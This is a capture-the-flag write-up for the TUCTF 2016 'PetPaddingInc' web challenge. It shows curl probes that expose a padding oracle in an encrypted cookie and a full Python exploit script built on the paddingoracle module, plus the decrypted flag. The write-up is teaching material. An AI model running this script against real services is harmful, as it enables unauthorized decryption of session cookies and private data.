# TUCTF 2016: PetPaddingInc

## Challenge details
| Event | Challenge | Category | Points |
|:------|:----------|:---------|-------:|
| TUCTF | PetPaddingInc | Web | 150 |

### Description
> We believe a rouge whale stole some data from us and hid it on this website.
>
> Can you tell us what it stole?
> 
> http://104.196.60.112/

## First steps

If we make a request to http://104.196.60.112/ we see a cookie being set:

```bash
Set-Cookie:  youCantDecryptThis="0KL1bnXgmJR0tGZ/E%2B%2BcSDMV1ChIlhHyVGm36/k8UV/3rmgcXq/rLA%3D%3D"
```

This seems to be an urlencode(base64($something));

Lets see how the server reacts to other values:

With an empty value: 
```bash
$curl --url 'http://104.196.60.112/' --cookie 'youCantDecryptThis=' -i
Warning: I couldn't process your request
```
Lets try encoding our own message:

```python
print urllib.quote(base64.b64encode('aa'))
YWE%3D
```
```bash
$curl --url 'http://104.196.60.112/' --cookie 'youCantDecryptThis=YWE%3D' -i 
Warning: I couldn't process your request
```

```python
print urllib.quote(base64.b64encode('aaaaaaaa'))
YWFhYWFhYWE%3D
```
```bash
$curl --url 'http://104.196.60.112/' --cookie 'youCantDecryptThis=YWFhYWFhYWE%3D' -i 
Warning: Bad padding
```

Bad Padding.. if we enter 8 characters, the server responds with a 'bad padding' message. This is a classic example of a so called [Padding Oracle](https://en.wikipedia.org/wiki/Padding_oracle_attack) 
This can be exploited to reveal the plaintext of an encrypted message


## Exploitation
Luckily, there is a python module called paddingoracle which automates all the hard work, we just have to implement a single method to define the padding failure message, and fire the exploit:

```python
#!/usr/bin/env python
#
# TUCTF 2016
# PetPaddingInc (WEB/150)
#
# @a: Smoke Leet Everyday
# @u: https://github.com/smokeleeteveryday
#
from paddingoracle import BadPaddingException, PaddingOracle
from base64 import b64encode, b64decode
from urllib import quote, unquote
import requests
import socket
import time

class PadBuster(PaddingOracle):
    def __init__(self, **kwargs):
        super(PadBuster, self).__init__(**kwargs)
        self.session = requests.Session()
        self.wait = kwargs.get('wait', 2.0)

    def oracle(self, data, **kwargs):
        somecookie = quote(b64encode(data))
        self.session.cookies['youCantDecryptThis'] = somecookie

        while 1:
            try:
                response = self.session.get('http://104.196.60.112/',
                        stream=False, timeout=5, verify=False)
                break
            except (socket.error, requests.exceptions.RequestException):
                logging.exception('Retrying request in %.2f seconds...',
                                  self.wait)
                time.sleep(self.wait)
                continue

        self.history.append(response)
	print response.headers
        if 'warning' in response.headers:
            if "padding" in response.headers['warning']:
		raise BadPaddingException
            
	    logging.debug('Warning, No padding exception raised on %r', somecookie)
            return

	return

if __name__ == '__main__':
    import logging
    import sys

    if not sys.argv[1:]:
        print 'Usage: %s <somecookie value>' % (sys.argv[0], )
        sys.exit(1)

    logging.basicConfig(level=logging.DEBUG)

    encrypted_cookie = b64decode(unquote(sys.argv[1]))

    padbuster = PadBuster()

    cookie = padbuster.decrypt(encrypted_cookie, block_size=8, iv=bytearray(8))

    print('Decrypted somecookie: %s => %r' % (sys.argv[1], cookie))
```

Which will eventually after a LOAD of requests, show the following flag:

```bash
INFO:PadBuster:Decrypted
Decrypted somecookie: 0KL1bnXgmJR0tGZ/E%2B%2BcSDMV1ChIlhHyVGm36/k8UV/3rmgcXq/rLA%3D%3D => bytearray(b'TUCTF{p4dding_bec4use_5ize_m4tt3rs}\n\x04\x04\x04\x04')
```

Giving us the flag

```bash
TUCTF{p4dding_bec4use_5ize_m4tt3rs}
```
